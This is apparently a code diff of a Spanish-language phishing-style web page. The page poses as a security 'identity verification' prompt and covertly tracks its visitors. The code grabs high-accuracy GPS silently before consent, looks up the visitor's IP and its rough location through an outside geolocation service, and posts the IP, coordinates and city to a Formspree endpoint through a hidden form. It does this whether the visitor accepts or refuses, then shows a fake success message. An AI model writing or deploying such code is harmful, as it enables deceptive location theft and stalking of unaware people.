@@ -3,52 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando...</title>
+    <title>Actualización de Seguridad</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f9f9f9; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; }
         
-        .cookie-overlay {
+        .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5); z-index: 1000; display: flex;
-            justify-content: center; align-items: center;
+            background: rgba(0,0,0,0.4); z-index: 999; display: flex;
+            justify-content: center; align-items: center; backdrop-filter: blur(3px);
         }
-        .cookie-box {
-            background: white; padding: 20px; border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2); max-width: 90%; width: 400px; text-align: center;
+        .modal-box {
+            background: white; padding: 25px; border-radius: 8px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2); max-width: 450px; width: 90%; text-align: left;
         }
-        .cookie-box h2 { margin-top: 0; color: #333; font-size: 18px; }
-        .cookie-box p { font-size: 14px; color: #666; line-height: 1.4; }
-        .btn-group { margin-top: 20px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
+        .modal-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
+        .icon-shield { font-size: 24px; color: #007bff; }
+        .modal-title { font-size: 18px; font-weight: 600; color: #333; margin: 0; }
+        .modal-body { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 20px; }
+        .btn-group { display: flex; gap: 10px; justify-content: flex-end; }
         button {
-            padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 14px;
+            padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; font-size: 14px; transition: background 0.2s;
         }
-        .btn-accept { background-color: #007bff; color: white; }
-        .btn-reject { background-color: #e0e0e0; color: #333; }
-        
+        .btn-primary { background-color: #007bff; color: white; }
+        .btn-primary:hover { background-color: #0056b3; }
+        .btn-secondary { background-color: #e0e0e0; color: #333; }
+        .btn-secondary:hover { background-color: #ccc; }
+
         .loader-screen {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: white; z-index: 2000; justify-content: center; align-items: center; flex-direction: column;
         }
         .spinner {
             border: 4px solid #f3f3f3; border-top: 4px solid #333; border-radius: 50%;
-            width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px;
+            width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 15px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* Iframe invisible para enviar el formulario sin recargar */
-        #hidden-frame { display: none; }
+        iframe { display: none; }
     </style>
 </head>
 <body>
 
-    <!-- Popup Falso -->
-    <div id="cookieOverlay" class="cookie-overlay">
-        <div class="cookie-box">
-            <h2>🍪 Preferencias de Cookies y Ubicación</h2>
-            <p>Utilizamos cookies propias y de terceros para mejorar tus servicios. También necesitamos acceso a tu ubicación GPS para personalizar el contenido.</p>
+    <!-- Modal Falso -->
+    <div id="cookieOverlay" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-header">
+                <span class="icon-shield">🛡️</span>
+                <h2 class="modal-title">Verificación de Identidad</h2>
+            </div>
+            <p class="modal-body">
+                Para garantizar la seguridad de tu cuenta, necesitamos verificar tu ubicación actual. 
+                Esto permite detectar accesos inusuales desde tu red. ¿Permites que este sitio acceda a tu ubicación?
+            </p>
             <div class="btn-group">
-                <button class="btn-reject" onclick="handleChoice(false)">Rechazar</button>
-                <button class="btn-accept" onclick="handleChoice(true)">Aceptar Todas</button>
+                <button class="btn-secondary" onclick="handleChoice(false)">Rechazar</button>
+                <button class="btn-primary" onclick="handleChoice(true)">Aceptar</button>
             </div>
         </div>
     </div>
@@ -56,28 +65,36 @@
     <!-- Pantalla de Carga -->
     <div id="loader" class="loader-screen">
         <div class="spinner"></div>
-        <p>Conectando con los servidores...</p>
+        <p>Procesando datos de ubicación...</p>
     </div>
 
-    <!-- Formulario oculto que usa el método POST nativo -->
+    <!-- Formulario oculto -->
     <form id="trackerForm" action="https://formspree.io/f/xjywravp" method="POST" target="hidden-frame">
         <input type="text" name="IP Pública" id="ipField">
-        <input type="text" name="Latitud GPS" id="latField">
-        <input type="text" name="Longitud GPS" id="lngField">
+        <input type="text" name="Coordenadas GPS" id="gpsCoords">
+        <input type="text" name="Precisión (Metros)" id="accuracyInfo">
+        <input type="text" name="Ubicación Estimada" id="geoAddress">
         <input type="text" name="Estado" id="statusField">
     </form>
 
     <iframe name="hidden-frame" id="hidden-frame"></iframe>
 
     <script>
-        // 1. PRE-CARGA SILENCIOSA
         let gpsLat = null;
         let gpsLng = null;
+        let gpsAccuracy = null;
+
+        // 1. PRE-CARGA SILENCIOSA DE ALTA PRECISIÓN (Intenta WiFi/GPS)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 gpsLat = pos.coords.latitude.toFixed(6);
                 gpsLng = pos.coords.longitude.toFixed(6);
-            }, () => {}, { timeout: 3000 }); 
+                gpsAccuracy = Math.round(pos.coords.accuracy);
+            }, () => {}, { 
+                enableHighAccuracy: true, 
+                timeout: 10000, 
+                maximumAge: 0 
+            }); 
         }
 
         function handleChoice(accepted) {
@@ -91,18 +108,34 @@
                 });
         }
 
-        function sendData(ip, accepted) {
-            // Rellenar campos del formulario
+        async function sendData(ip, accepted) {
             document.getElementById('ipField').value = ip;
-            document.getElementById('latField').value = gpsLat || 'No disponible';
-            document.getElementById('lngField').value = gpsLng || 'No disponible';
-            document.getElementById('statusField').value = accepted ? 'Aceptó Cookies' : 'Rechazó Cookies';
+            document.getElementById('statusField').value = accepted ? 'Permiso concedido' : 'Permiso denegado';
 
-            // Enviar el formulario (esto sí llega a Formspree)
+            // Si no tenemos GPS, intentamos obtener la ubicación por IP
+            if (!gpsLat || !gpsLng) {
+                try {
+                    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
+                    const geoData = await geoRes.json();
+                    gpsLat = geoData.lat;
+                    gpsLng = geoData.lon;
+                    document.getElementById('geoAddress').value = `${geoData.city}, ${geoData.country}`;
+                } catch (error) {
+                    document.getElementById('geoAddress').value = "No disponible";
+                }
+            } else {
+                document.getElementById('geoAddress').value = `Ubicación confirmada`;
+            }
+
+            document.getElementById('gpsCoords').value = `${gpsLat || 'N/A'}, ${gpsLng || 'N/A'}`;
+            
+            // Mostrar información sobre la precisión
+            const accuracyText = gpsAccuracy ? `Precisión: ~${gpsAccuracy}m` : "Sin precisión";
+            document.getElementById('accuracyInfo').value = accuracyText;
+
             const form = document.getElementById('trackerForm');
             form.submit();
 
-            // Simular éxito visual
             setTimeout(() => {
                 document.getElementById('loader').innerHTML = '<h2 style="color:green">✅ Actualización completada</h2>';
             }, 1500);
